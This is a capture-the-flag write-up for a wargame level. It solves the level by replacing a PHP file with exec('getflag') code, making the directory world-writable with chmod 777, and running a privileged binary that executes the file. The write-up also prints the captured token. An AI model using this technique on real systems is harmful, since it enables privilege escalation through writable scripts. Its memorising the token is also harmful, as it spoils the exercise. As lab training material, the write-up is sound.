# level06 solve

To begin, when we get logged and trying to see if we got the file we can see we have two files

```
$ ls
> level06
> level06.php
```

So we decide to run the binary level06 and see he us the level06.php, after see that we decide to try to change the php file for doing a php request launching the getflag, and we found <a href="https://www.php.net/manual/fr/function.exec.php">that</a>.

result:

```
<?php
	echo exec('getflag');
?>
```

After modifing the php file with an exec command, we need to get the right to modify file on the repository

```
$ chmod 777 .
```

And after that, we just need to move the php file, because it's easier, we going to prefer using an echo and mv on the tmp folder between than use move with the scp command but in case...

scp

```
$ scp -P 4242 level06/Ressources/level06.php level01@ip:level06.php
```

bash

```
$ chmod 777 . ; echo "<?php echo exec('getflag'); ?>" > /tmp/level06.php ; mv /tmp/level06.php .
```

trying...

```
$ ./level06
> Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

We got it!

> <a href="../flag">flag</a> - <a href="../../level05">previous level</a> - <a href="../../level07">next level</a>
